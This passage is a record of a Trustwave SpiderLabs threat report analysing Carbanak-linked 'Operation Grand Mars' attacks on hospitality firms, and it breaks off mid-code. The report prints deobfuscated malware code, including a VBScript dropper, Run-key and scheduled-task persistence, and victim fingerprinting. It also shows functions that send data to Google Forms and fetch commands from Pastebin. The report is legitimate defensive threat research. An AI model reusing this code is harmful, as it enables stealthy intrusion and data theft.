{
    "id": "c70d739e-cc14-4572-ad0e-e3e8401007a2",
    "created_at": "2022-10-25T16:48:17.754008Z",
    "updated_at": "2025-03-27T02:16:57.992427Z",
    "deleted_at": null,
    "sha1_hash": "d24be75959478224c4010d195a3db784a9dc56ca",
    "title": "",
    "authors": "",
    "file_creation_date": "2017-01-18T09:06:10Z",
    "file_modification_date": "2017-01-18T09:06:19Z",
    "file_size": 2441174,
    "plain_text": "###### A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORT\n# Operation Grand Mars:\n### Defending Against Carbanak Cyber Attacks\n\n\n-----\n\n## Operation Grand Mars:\n#### Defending Against Carbanak Cyber Attacks\n\n**Author** \u0007Thanassis Diogos\n_EMEA Managing Consultant, Incident Response, Trustwave_\n\n**Contributors** \u0007Sachin Deodhar\n_EMEA Incident Response Consultant, Trustwave_\n\n\u0007Rodel Mendrez\n_Security Researcher, Trustwave_\n\n##### Table of Contents\n\n###### Executive Summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1\n\n Analysis and Findings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n Point of Entry . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n Phishing email and malicious Word document . . . . . . . . . . . . . . . . . . . . . . . . . . 3\n\n Document analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n\n Embedded Script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\n\n Artifacts from email attachment . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n Starter.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13\n\n TransbaseOdbcDriver.js . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14\n\n LanCradDriver.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n LanCradDriver.ini . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n\n Activity Summary . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20\n\n Achieving Persistence . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n\n PowerShell Script . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23\n\n Registry Autorun . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\n Task Scheduler . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24\n\n Lateral movement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n\n Pass the Hash . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n\n Further malicious files . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\n AdobeUpdateManagementTool.vbs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27\n\n UVZHDVlZ.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\n\n Update.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31\n\n 322.exe . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34\n\n Conclusions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36\n\n Remediation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n\n Tactical (short to medium term) countermeasures . . . . . . . . . . . . . . . . . . . . . . 38\n\n Key industries be aware . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n\n Appendix A: Files . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 39\n\n Appendix B: Malicious hosts/IP addresses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40\n\n References . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 40\n\n List of Figures . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41...........................................................\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n##### Executive Summary\n\nDuring September and October of 2016, the SpiderLabs team at Trustwave was consulted by several leading\norganizations from the hospitality sector in Europe and the United States to analyze suspicious and potentially\nmalicious activity on their network including servers, point-of-sale terminals and client workstations that were spread\nacross different properties and locations.\n\nThe motivation of this operation appears to be financial gain, total control of the infrastructure and collection of\nbots within the victim organizations. The forensics investigation and analysis indicates that these activities had\nbeen performed by different individuals or different groups of people, leading us to conclude that several malicious\ngroups had cooperated in this operation with each group holding its own role and task. It soon became obvious that\nwe were dealing with organized crime responsible for establishing this complex system of network hosts and large\nnumbers of malicious files in order to perform the attacks against multiple victims.\n\nThe organizations under attack had been alerted either from their enterprise AV service that discovered pieces of\npotentially malicious software or from suspicious indicators in Windows event logs. Since the victims were different\norganizations the investigations were conducted by separate teams within Trustwave but intelligence sharing among\nthe teams proved that several similarities existed among the attacks.\n\nThe common successful entry point within all operations was an email message targeting the victim’s public-facing\nservices that contained a Microsoft Word document as an attachment. Once the attachment was opened multiple\nmalicious files were created or downloaded allowing the attackers to gain some level of access into the victim’s\ninfrastructure. In some cases, attackers actually called the victims over the phone, a social engineering vector, in\norder to trick them into opening the attachments.\n\nNext, several pass the hash techniques were performed to escalate privileges while persistence was achieved by\nutilizing scheduled tasks and several of the operating system’s auto-start locations. Ultimately these actions allowed\nthe attackers to gain domain or even enterprise admin level access to the network using several resources as\nCommand & Control points in Europe and the US.\n\nThe attackers used cloud services such as Google Docs, Google Forms and Pastebin.com to keep track of infected\nsystems, spread malware and perform additional malicious activities. It is beneficial for attackers to incorporate\nsuch services into an attacks since most enterprise networks allow access to these services and it is almost\nimpossible to blacklist them.\n\nMalicious code used in these operations was split among memory resident code, scripting code (PowerShell,\nJavaScript, VBS), executables (often variants of existing malware) and usage of customized versions of toolkits such\nas Metasploit [1], PowerSploit [2] and Veil Framework [3].\n\nThe core tools used in these activities appear to comprise a variant of Anunak, remote backdoor, along with a Visual\nBasic Script specially crafted with data exfiltration features.\n\nAnother significant finding is that some of the executables were signed using valid certificates from Comodo, a\nCertification Authority. Based on the analysis of the certificates we believe that the attackers purchased and used\nfake identities to bypass additional security controls.\n\nThis document describes what we believe to be a systematic criminal operation of attacks targeting the hospitality\nsector in Europe and the US, at least at this time. However, the findings suggest that other sectors such as\ne-commerce and retail are equally at risk and the campaign could just as easily spread to other parts of the world.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe majority of IP addresses used as Command & Control points were unknown systems located within Europe (UK,\nFrance, Sweden etc.) indicating that attackers were trying to bypass network security controls by using seemingly\ninnocuous servers as malicious endpoints. During the investigation of this operation we monitored access to these\nC&C servers and found that the attackers would occasionally change their C&C server and take the previous one\noff-line. We believe that this alternating use of C&C servers was a purposeful action by attackers in order to remain\nas stealthy as possible.\n\nWe called this operation “Grand Mars” after the name that cyber criminals used in one of the digital certificates\npurchased from Comodo. While the name and Russian details (city, address etc.) used in the certificate details are\nprobably fake, the fact that someone actually paid for these certificates is a strong indicator that we are dealing with\norganized crime activities.\n\nThis Advanced Threat Report is intended to provide an analysis of this operation and document:\n\n**•** Our analysis and findings in a way that describe the nature of malicious activities, the tactics and tradecraft\n\nutilized by the attackers, possible motives and the attribution of the threat actors behind these attacks.\n\n**•** Remediation actions and advice to organizations that have already been targeted by this campaign of attacks or\n\nwilling to take proactive countermeasures.\n\n**•** Indicators of Compromise (IOCs) that will benefit organizations seeking to either undertake a compromise\n\nassessment on their own (or with the help of a team that specializes in threat hunting and compromise\nassessments such as Trustwave SpiderLabs), or to proactively put in place detection mechanisms for providing\nan early warning system, if and when the organization is targeted.\n\nHowever, it must be noted that this Advanced Threat Report does not and is not capable of replacing formal incident\nresponse actions and procedures that must be undertaken to mitigate the threat and restore business functions as\nper the Organizational Incident Response/Disaster Recovery roadmap.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n##### Analysis and Findings\n\n###### POINT OF ENTRY\n\nThe first objective of the investigation was to identify the precise entry point of the attackers into the network and\nthe method of initial compromise exercised.\n\n###### Phishing email and malicious Word document\n\nThe numerous investigations conducted globally by the Trustwave SpiderLabs team identified a common event at\nthe beginning of the timeline of these attacks–that one or more employees had received what appeared to be, prima\nfacie, a targeted phishing email with a potentially malicious Word document attachment.\n\n**Figure 1. \u0003Email received by victim with a Word attachment**\n\n\nGood day, we would like to book rooms for our employees. 12 people will arrive in Paris on November 24.\nRoom types attached with this email, as well as the names of employees. If you have a room available, we\nwill make a deposit. Waiting for you reply\n\n\n**Figure 2. \u0003Message body of the suspect email**\n\nWhile the content of message appears to be legitimate and is related to the organization’s services (hospitality\nsector) the email contained a Microsoft Word document attachment (.docx) – as seen in the screenshot below, 1-list.\ndocx is the name of the document attached.\n\n**Figure 3. \u0003Microsoft Word .docx attachment (1-list.docx)**\n\nThe malware authors called the victim directly via phone and asked for the attachment to be opened to ensure\ninfection, since the default setting in Microsoft Word prevents execution of any macro code. This was the social\nengineering element of the attack vector used to convince the user to execute the macro by double clicking an\nimage shown inside the opened document.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n Document analysis\n\nA detailed examination of the attached Word document proves that this was the vector used by the attackers to\ngain entry into the targeted organization’s network. The 1-list.docx file appears to be a Macro-Enabled malware,\ndesigned to drop and execute malicious code on the target system.\n\n**Figure 4. \u0003Word .docx Macro enabled malware**\n\nThe latest office format [4] (.docx, .xlsx etc.) is actually a compressed XML-based file format developed by Microsoft\nwhich can be extracted as normal compressed files. After uncompressing the contents of the Word document an\nembedded OLE object (oleObject1.bin) was revealed.\n\n**Figure 5. \u0003Embedded oleObject0.bin file from Word document**\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nInside the contents of the oleObject1.bin, there are indicators of a macro code (unprotected.vbe) embedded in the\ndocument, which seem to be encoded.\n\n**Figure 6. \u0003oleObject.bin showing potentially encoded content**\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe strings seen in the screenshot above from oleObject1.bin indicate that the attackers have used an evaluation\nversion of a commercially available script encoding/encryption tool called “Scripts Encryptor” [5].\n\n**Figure 8. \u0003Tool used for obfuscating the VBE script**\n\n###### Embedded Script\n\nAfter manually decoding the contents of oleObject1.bin the result was a VBScript, as expected. The script contains\nseveral functions, a subset of them used for transforming data from custom variables embedded in the body of the\nscript using techniques such as “BinaryToStRinG, StringTOBinary” and “Base64DecodE, base64ENcode”.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nFunctiON strEaM_BinaryToStRinG(BinaRy)\nOn ErrOr ReSume NeXt\nCoNSt aDTypEText=2\nConst ADTyPebiNAry=1\nDim BinArySTream\nSet BinaRYStream=CReateObject(“ADODB.Stream”)\nBInaryStrEaM.TyPe=adTypEBinarY\nBinarYStReaM.OpEn\nBinaRyStReam.Write binary\nBInaryStream.PosiTion=0\nbInAryStream.TyPe=aDtypeText\nBinarystream.chArSeT=”utf-8”\nStream_BinaryToStrIng=BinaryStream.ReadText\nSeT BinaryStream=Nothing\nEnd function\nfuNctIon StReam_StringTOBinary(TeXt)\nOn ERRor Resume Next\nCoNst AdTypeText=2\nConst adTypeBinary=1\nDim BinaryStream\nSet BinaryStreAm=CreateObject(“ADODB.Stream”)\nBinaryStream.type=adtypeTExT\nBinaRyStream.charSet=”utf-8”\nBinarystreAm.Open\nbinarystrEam.writeText TExt\nBinarYstream.Position=0\nBinaryStReam.Type=adTypebinary\nbinaRyStream.Position=0\nStream_STringTOBinarY=Binarystream.ReaD\nSeT BINAryStream=Nothing\nEnd Function\n\n**Figure 9. \u0003Binary to String conversion functions**\n\nFunction Base64DecodE(byVal vCODe)\nOn Error Resume Next\nDim oxMl,ONOde\nSEt oXML=CreaTeObjEcT(“Msxml2.DOMDocument.3.0”)\nSeT oNode=oxML.CreateEleMent(“base64”)\noNodE.dAtaType=”bin.base64”\noNOde.text=vCode\nBase64decode=Stream_BINaryToString(oNoDe.nodetypedVALUe)\nSet oNode=NothinG\nSEt oXML=Nothing\nEnd Function\nFunctioN base64ENcode(sText)\nOn Error resume next\nDim oXML,oNode\nsEt oXMl=CreatEObJECT(“Msxml2.DOMDocument.3.0”)\nSeT oNode=oXmL.creAteElement(“base64”)\noNode.daTaType=”bin.base64”\noNode.nodeTypedvalue=STreAm_StrinGToBinaRy(sTExT)\nBaSe64encode=oNode.tExt\nSet onode=NothinG\nSeT oxML=NothIng\nEnd FunCtion\n\n**Figure 10. \u0003Base64 encode-decode functions**\n\nWhat seems to be one of the main usages of the embedded script is the creation of several other files on the infected\nsystem using the functions listed earlier The new files were written by converting data stored in a variable named “f”\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nsuB ggL_StartER(pth)\nON ErROR rESume Next\nDIm f\nf=”T24gRXJyb3IgUmVzdW1lIE5leHQNCkRpbSBvYmpTaGVsbCxwYXRoDQpTZXQgb2JqU2hlbGwgPSBX”\n.\n… … … … (truncated) … … … … …\n.\nf=f&”IlxUcmFuc2Jhc2VPZGJjRHJpdmVyLmpzIg0KcGF0aCA9ICJjbWQuZXhlIC9rIHdzY3JpcHQuZXhl”\nf=f&”ICIiIiAmIHBhdGggJiAiIiIiDQpvYmpTaGVsbC5SdW4gcGF0aCwgMCwgdHJ1ZSANClNldCBvYmpT”\nf=f&”aGVsbCA9IE5vdGhpbmc=”\nSet Sh=CReAteObjECt(“WScript.Shell”)\nDiM woRkpath,stAtmkDiR\nWorkPath=pth\nstaTMkDIr=CreatEDIr(workpatH)\nIF statMkDir Then sEt oBjFSO=CreateObjecT(“Scripting.FileSystemObject”)\noutFile=wOrkPath&”\\starter.vbs”\nSet oBjFiLe=objfSO.CreATeTextfile(outFile,TRue)\noBjFile.WriTe BAse64DEcode(f)\nobjFile.CLosE\nEnd If\nEnd sub\n\n**Figure 11. \u0003Starter.vbs creation (truncated)**\n\nThe above section of the code will create the starter.vbs file in the user’s Temp folder.\n\nSuB folderIniT(pth)\non ErRor Resume Next\nSet Sh=CreateOBject(“WScript.Shell”)\nDim WoRkPaTh,statMKDir\nWorkPath=pth\nstatmKDir=CreateDir(woRkPath)\nIF STaTMkDiR tHEn SeT oBjFSO=CReatEOBJEct(“Scripting.FileSystemObject”)\noutFILe=WOrkPath&”\\LanCradDriver.ini”\nSet objFile=objFSO.CrEateTextFiLe(outFile,TruE)\noBjFile.cLosE\nEnd If\nEnd SuB\nseT sh=CreateObJecT(“WScript.Shell”)\nDim Workpath,statMKDir\nWOrkpath=PtH\nStatMkDir=CreAteDiR(WorkPaTh)\nif sTatMkDir Then SEt ObjFSO=CreateObject(“Scripting.FileSystemObject”)\noUtFile=WorkPath&”\\LanCradDriver.vbs”\nSet objFIle=objfsO.CReaTetextFile(oUtFIle,TRue)\nobjFile.Write Base64DeCodE(f)\nobjFile.Close\nEnd If\nEnd SuB\n\n**Figure 12. \u0003LanCradDriver.vbs LanCradDriver.ini creation**\n\nSimilarly, the code above will create the LanCradDriver.vbs and an empty LanCradDriver.ini file in the User’s Temp\nfolder. The role of LanCradDriver.ini will be explained in a later section.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nf=”dmFyIG9ialNXYmVtU2VydmljZXNFeCA9IEdldE9iamVjdCgid2lubWdtdHM6e2ltcGVyc29uYXR”\n.\n. … … … … (truncated) … … … … …\n.\nF=f&”dpYWMrIi4iK3Jlc3VsdDsNCglyZXR1cm4gCXJlc3VsdDsNCn0NCg0KZnVuY3Rpb24gU2hvd1Bhc”\nf=f&”mVudEZvbGRlck5hbWUoZmlsZXNwZWMpDQp7DQogICB2YXIgZnNvLCBzID0gIiI7DQogICBmc28g”\nf=f&”PSBuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTsNCiAgIHM”\nf=f&”gKz0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoZmlsZXNwZWMpOw0KICAgcmV0dXJuKHMpOw0KfQ”\nf=f&”==”\nSet sh=CreateObjeCT(“WScript.Shell”)\nDim WorkPath,statMkdir\nWorkPath=pth\nstatmkDir=CReatEDir(WorkPAth)\nif statMkDiR then SEt oBJFSO=CReateObJecT(“Scripting.FileSystemObject”)\noUtfIle=WorkPaTh&”\\TransbaseOdbcDriver.js”\nSet objfile=objFSO.CreateTextFile(outFile,true)\nobjFile.Write BaSE64DecOde(f)\nobjFiLe.ClOse\nsh.RuN”wscript “””& oUtFile&””””,0,False\nEnd If\nEnd Sub\n\n**Figure 13. \u0003TransbaseOdbcDrive.js creation (truncated)**\n\nThe last file created named TransbaseOdbcDriver.js fileis executed using wscript.exe under a hidden command shell.\n\nSet sh=CrEateObject(“WScript.Shell”)\ndim WsCript_pthpath\nwscriPt_pthpath=sh.ExpandEnvironMentStrings(“%WINDIR%”)+”\\System32\\WScript.exe”\nDIm run_ptH_scr\nrUN_pth_scr=pTh+”\\starter.vbs”\ndim run_pTh\nrun_pth=””””&wscript_Pthpath&””” “””&run_ptH_scR&””””\nsh.RegWRite”HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/TransbaseOdbcDriver”,\nrun_pth,”REG_SZ”\nsh.run”schtasks /create /tn “”SysChecks”” /tr “””&run_PTh&””” /sc minute /mo 30”,0,FAlse\nEnd sub\n\n**Figure 14. \u0003Persistence of starter.vbs**\n\nIn addition to the files created, the embedded script (oleObject1.bin) adds a registry key for persistence, which\ncomprises a scheduled task to call starter.vbs periodically (every 30 min) and finally executes starter.vbs.\n\nAnother interesting function computes a unique CUID using the system’s hard drive serial number. Utilizing this\nfunction points to the fact that attackers seek a unique identifier from each infected system. The output of the\nfunction is Base64 encoded and stored as “cuid” which is used later on in the operation.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nFUnction cuid()\nOn errOr Resume next\nDim Giac\ngiac=”4”\ndim uuid\nuuid=”1”\nDim FSO,D,serial\nSet FSO=CrEATeobjecT(“Scripting.FileSystemObject”)\nsTrDrive=fsO.GetDrivEname(fSo.GetSpEcIalFolDer(0))\nseT D=FsO.GEtDrive(strDrive)\nSerial=D.SeriAlNumber\nDiM Result\nResulT=BAse64Encode(“”&SeriaL)\nrEsult=MId(cleArStr(rESult),1,20)\ncuiD=uuid&”.”&giac&”.”&result\nenD Function\n\n**Figure 15. \u0003Calculating and encoding of Disk S/N**\n\nInternet activity also indicated a function that checks for proxy settings on the infected system, an indicator of\nsuspicious internet activity as part of this operation and will be explained later in this document.\n\nProxyEnaBlE=objshelL.RegREad(“HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ProxyEnable”)\nif ProxyEnable=”1”TheN\nProxySeRver=objshell.RegREad(“HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ProxyServer”)\ngetPRoxy=ProxySeRVEr\nElse GEtProxy=””\nend if\n\n**Figure 16. \u0003Checking proxy configuration**\n\nMaIn()\nOn ErroR ResumE nEXt\nDim Txt\ntxt=cuid()\ntxt=tXt&” | “&GetUseRData()\ntxt=tXt&” | “&Iswin32Orwin64()\ntXt=txt&” | “&GetOS()\ndim REs\nres=sendFormData(tXt)\nDim Fso,currDir,currDirPlus\nSet fso=CreateOBjecT(“Scripting.FileSystemObject”)\ncurrdiR=fso.GEtParEntFolderNaMe(Wscript.ScriptFullNAMe)\ncurrDirPlus=currdiR&”\\TransbaseOdbcDriver”\nfoldeRInIt currDiRPlus\nggL_rUner currDirplus\ngGl_STarter cUrrDIrPluS\nGgl_hex currDirPlus\nSetREgDatA currdirPlus\nabraCadabra\nEnd Sub\nMain\n\n**Figure 17. \u0003Main function**\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe “Main” function takes care of the last bits during this first stage of the operation. Initially it calls cuid(),\ncomputing disk s/n as we’ve seen earlier and then some other helper functions. These gather user data such as\nusername, computer name/domain (GetUseRData), check OS architecture (Iswin32Orwin64) and get OS version\n(GetOS). All of this data is stored in the variable “txt” and then another function called sendFormData” is used to\nhandle them.\n\nFunctIon sendFormDaTa(Value)\nOn ErrOR resume next\nDim foRmkey\nformkeY=”e/1FAIpQLSfsumC-aXeUevDfI852NkJN4- ”\nDiM enTry\nentry=”entry.1269488164”\nDim rc\nDim HttpRequest\nOn ErrOR ReSuMe next\nSet HtTpRequest=CreateobJect(“Msxml2.ServerXMLHTTP.6.0”)\nIf Err.NumbEr<>0 tHen sendFormDatA=falSe\nSet httPReQuEst=Nothing\nExit FuNCtion\nend If\ndim PRoX\nProx=gETProxy\nHttpRequest.OPen”POST”,”https://docs.google.com/forms/d/”&fOrMkeY&”/formResponse”,FalSe\nif prox<>””thEn HttpreQueSt.setProxy 2,prox,””\nEnd iF\nHTtpRequesT.sEtRequeStHEadeR”Content-Type”,”application/x-www-form-urlencoded”\nOn Error Resume Next\nHttpRequeSt.Send(entry&”=”&ValuE)\nIf HttpRequest.rEadystate<>4 Then httpRequEst.WaitForRespOnse 30\nEnd If\nrc=httpRequest.StatusText\nIf ERr.Number<>0 THeN sendFormData=False\neXit FUnction\nEnd If\nIf Rc=”OK”THen sendformData=True\nElSe senDFormData=FaLse\nEnD If\nSeT httprequeSt=Nothing\nEnd Function\n\n**Figure 18. \u0003sendFormData function**\n\nThe function shown above is used to connect and submit data using Google Forms. At this stage the information\ngathered before (user data, disk s/n etc.) will be collected by the malware operators using the Google Form\ndisplayed below.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n**Figure 19. \u0003Initial submission Google Form**\n\nThe name of the form “formFirstPingBotList” is self-explanatory, collecting initial information from victims. Usage of\nsuch services is always beneficiary for attackers since they usually have unrestricted accessin most networks.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n ARTIFACTS FROM EMAIL ATTACHMENT\n\nAs we’ve seen, opening the Word document executes the embedded script and drops the following four files:\n\n**Figure 20. \u0003Files dropped on execution of embedded VBE script**\n\nNote in the screenshot above, that the LanCradDriver.ini file is a zero-byte file (empty). It is merely “touched”\nbut not yet populated. As you will see further in this analysis, the file is subsequently populated after the\nTransbaseOdbcDriver.js script has executed.\n\n###### Starter.vbs\n\nThis is a VBScript file, which as shown earlier, uses registry Autorun and Task Scheduler to achieve persistence and\nexecutes the actual payload.\n\n**Hash Type** **Value**\n\nMD5 E63F45968AE3E534D6A4AFE891830541\n\nSHA-1 ECD5293A7FE1CDF262ED921620D80353CDED5DD0\n\nSHA256 270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA\n\nSSDeep 12:9vWd+vqfaHHI7kVLkqhBvKIIXURun+cPqrC:9A+vqfaHHI78LD/KILun+0qrC\n\n**Table 1. \u0003Hashes of Starter.vbs**\n\nThis is responsible for execution of the TransbaseOdbcDriver.js using wscript.exe within a hidden command prompt.\n\nOn Error Resume Next\nDim objShell,path\nSet objShell = WScript.CreateObject( “WScript.Shell” )\nDim fso, currDir, currDirPlus\nSet fso = CreateObject(“Scripting.FileSystemObject”)\ncurrDir = fso.GetParentFolderName(Wscript.ScriptFullName)\ncurrDirPlus = currDir\npath = currDirPlus & “\\TransbaseOdbcDriver.js”\npath = “cmd.exe /k wscript.exe “”” & path & “”””\nobjShell.Run path, 0, true\nSet objShell = Nothing\n\n**Figure 21. \u0003Starter.vbs script**\n\n|Hash Type|Value|\n|---|---|\n|MD5|E63F45968AE3E534D6A4AFE891830541|\n|SHA-1|ECD5293A7FE1CDF262ED921620D80353CDED5DD0|\n|SHA256|270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA|\n|SSDeep|12:9vWd+vqfaHHI7kVLkqhBvKIIXURun+cPqrC:9A+vqfaHHI78LD/KILun+0qrC|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe following screenshot displays starter.vbs being started by Task Scheduler. Starter.vbs in turn calls and executes\nTransbaseOdbcDriver.js, which is the core element in this stage of the attack.\n\n**Figure 22. \u0003Process information for TransbaseOdbcDriver.js**\n\n###### TransbaseOdbcDriver.js\n\nThis script includes several functions but we will focus on its main operation.\n\n**Hash Type** **Value**\n\nMD5 4EC7088AAC32C94A7046810925BC1697\n\nSHA-1 7B46BB249485B36C318D53FA070D945EA8DBF606\n\nSHA256 313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\n\nSSDeep 384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPhfi\n\n**Table 2. \u0003Hashes of TransbaseOdbcDriver.js**\n\nUpon execution it calls LoadLinkSettings() function which connects to Google Spreadsheet executing a Macro\nbased on the unique disk serial number (guid) as seen earlier in the document.\n\nfunction LoadLinkSettings() {\nvar go_com = InetRead(“https://script.google.com/macros/s/AKfycbyHCvQKeEwmgQqB661aUV_ /exec”+ “?bid=” + guid);\ntry {\nif( go_com[‘stat’] >= 200 && go_com[‘stat’] < 300){\nvar cmd_txt = go_com[‘text’];\nvar settingsArr = cmd_txt.match(\n/,\\\\x22userHtml\\\\x22:\\\\x22(.+)\\\\x22,\\\\x22ncc/ );\nvar setting = split(settingsArr[1],’$$$’,3);\nif (setting.length == 3) {\nreturn {\n“spreadsheetkey”: setting[0]\n,”formkey”: setting[1]\n,”entry”: setting[2]\n};\n}\nvar formkeyReg = “e/1FAIpQLScbMcfvLYkqA369ISWkWovJ_4ZkIc0nFdM4Ec_\nCv95PAAnllQ”;\nvar entryReg = “entry.960420097”;\nLogInet(guid,formkeyReg,entryReg);\n}\n\n**Figure 23. \u0003LoadLinkSettings() function**\n\nThe output of the macro code is then sliced ($$$) retrieving three important pieces of data used in the next steps of\nthe operation:\n\n**1.** SpreadSheetKey\n\n**2.** FormKey\n\n**3.** Entry\n\n|Hash Type|Value|\n|---|---|\n|MD5|4EC7088AAC32C94A7046810925BC1697|\n|SHA-1|7B46BB249485B36C318D53FA070D945EA8DBF606|\n|SHA256|313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4|\n|SSDeep|384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPhfi|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n**Figure 24. \u0003Google macro execution output**\n\nIt then calls LogInet() using these arguments and submits an entry of a new Bot/infected system using Google\nForms. The connection to Google Forms uses an Android HTC Pyramid model (Chinese – Taiwan language) Useragent string.\n\nfunction LogInet(value,formkey,entry) {\ntry {\nvar httpReq = new ActiveXObject(“Msxml2.ServerXMLHTTP.6.0”);\nhttpReq.setOption(2, 13056);\nhttpReq.setTimeouts(0, 0, 0, 0);\nurl = “https://docs.google.com/forms/d/” + formkey + “/formResponse”;\nhttpReq.open(“POST”, url, false);\nvar prox = getProxy()\nif( prox != “”){\nhttpReq.setProxy(2, prox, “”);\n}\nhttpReq.setRequestHeader(“User-agent”, “Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC\nPyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1”);\nhttpReq.setRequestHeader(“Content-Type”, “application/x-www-form-urlencoded”);\nhttpReq.send(entry + “=” + value);\n} catch (e) {}\n}\n\n**Figure 25. \u0003LogInet() function**\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nAfter successfully initializing, the script calls GetSourceCode() in an indefinite loop of 1 or 2 min intervals.\n\ndo {\nif ( setttingArr ) {\nGetSourceCode(setttingArr.spreadsheetkey, setttingArr.formkey, setttingArr.entry);\n}else{\nsetttingArr = LoadLinkSettings();\n}\nWScript.Sleep(1000*60*randInt(1,2));\n}\n\n**Figure 27. \u0003Calling GetSourceCode() function**\n\nGetSourceCode() function fetches data from Pastebin and stores it in a new file named dttsg.txt. Finally executes\nGetCommand().\n\nfunction GetSourceCode(aspreadsheetkey,aformkey,aentry) {\nvar GlobalObject = this;\nvar FSO = new ActiveXObject(“Scripting.FileSystemObject”);\nvar WshShell = new ActiveXObject(“WScript.Shell”);\nvar formkey = aformkey;\nvar entry = aentry;\nvar spreadsheetkey = aspreadsheetkey;\nvar botclass = GenerateString(8);\nvar last = TextFileRead( GLBFolderPlus + “\\\\dttsg.txt” );\nvar version = “1.0”;\nvar linkPB = “http://pastebin.com/raw/MfQV5e6R”;\nvar keyPath = 